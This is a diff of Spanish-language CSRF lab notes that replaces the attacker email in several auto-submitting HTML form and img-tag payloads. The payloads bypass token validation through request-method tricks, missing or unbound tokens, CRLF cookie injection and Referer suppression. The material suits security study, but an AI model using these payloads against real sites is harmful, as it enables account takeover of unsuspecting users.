@@ -33,7 +33,7 @@ Codigo de https://web-atacante.com/malicioso.html
 <html>
 	<body>
 		<form action="https://vulnerable-web.com/email/change" method="POST">
-			<input type="hidden" name="email" value="pwned@evil-user.net" />
+			<input type="hidden" name="email" value="pwned@gmail.com" />
 		</form>
 		<script> document.forms[0].submit(); </script>
 	</body>
@@ -43,7 +43,7 @@ Codigo de https://web-atacante.com/malicioso.html
 ### 2- CSRF donde la validación del token depende del método de solicitud <a name="CSRFenGET"></a>
 Dependiendo del metodo de peticion, se puede hacer con GET
 ```html
-<img src="https://vulnerable-web.com/my-account/change-email?email=pwned@evil-user.net"/>
+<img src="https://vulnerable-web.com/my-account/change-email?email=pwned@gmail.com"/>
 ```
 ---
 ### 3- CSRF donde la validación del token depende de la presencia del token <a name="CSRFenPresencia"></a>
@@ -53,7 +53,7 @@ No verifica el token CSRF, se eliminia y se bypassea.
 <html>
 	<body>
 		<form action="https://vulnerable-web.com/email/change" method="POST">
-			<input type="hidden" name="email" value="pwned@evil-user.net" />
+			<input type="hidden" name="email" value="pwned@gmail.com" />
              <input type="hidden"  value="csrf" />
 		</form>
 		<script> document.forms[0].submit(); </script>
@@ -69,7 +69,7 @@ Mi token: U6vJiRteqjSX46XRk57k6saqolEcdDvQ sirve para otros usuarios tambien.
 <html>
 	<body>
 		<form action="https://vulnerable-web.com/email/change" method="POST">
-			<input type="hidden" name="email" value="pwned@evil-user.net" />
+			<input type="hidden" name="email" value="pwned@gmail.com" />
                         <input type="hidden" name="csrf" value="<csrf>"  />
 		</form>
 		<script> document.forms[0].submit(); </script>
@@ -82,7 +82,7 @@ Por lo que se podria usar el mismo csrf token y la misma csrf key en una cuenta 
 <html>
   <body>
     <form action="https://vulnerable-web.com/email/change" method="POST">
-      <input type="hidden" name="email" value="pwn&#64;ed&#46;com" /> 
+      <input type="hidden" name="email" value="pwned@gmail.com" /> 
       <input type="hidden" name="csrf" value="<csrf>" />
       <input type="submit" value="Submit request" />    </form>
   <img src="https://vulnerable-web.com/?search=test%0d%0aSet-Cookie:%20csrfKey=<key>" onerror="document.forms[0].submit()">
@@ -104,7 +104,7 @@ Como se validaba el token en la cookie podemos mandar la peticion para el cambio
 <html>
     <body>
         <form action="https://vulnerable-web.com/email/change" method="POST" >
-            <input type="hidden" name="email" value="pwned@evil-user.net">
+            <input type="hidden" name="email" value="pwned@gmail.com">
             <input type="hidden" name="csrf" value="tokenfalsojeje">
         </form>
 		
@@ -125,7 +125,7 @@ Indicamos que no exista el Referer en el exploit del CSRF usando el tag de meta.
   </head> 
 <body> 
    <form action="https://vulnerable-web.com/email/change" method="POST"> 
-   <input type="hidden" name="email" value="pwned@evil-user.net" />
+   <input type="hidden" name="email" value="pwned@gmail.com" />
    <input type="submit"/>
 </form> 
    <script>document.forms[0].submit();</script>
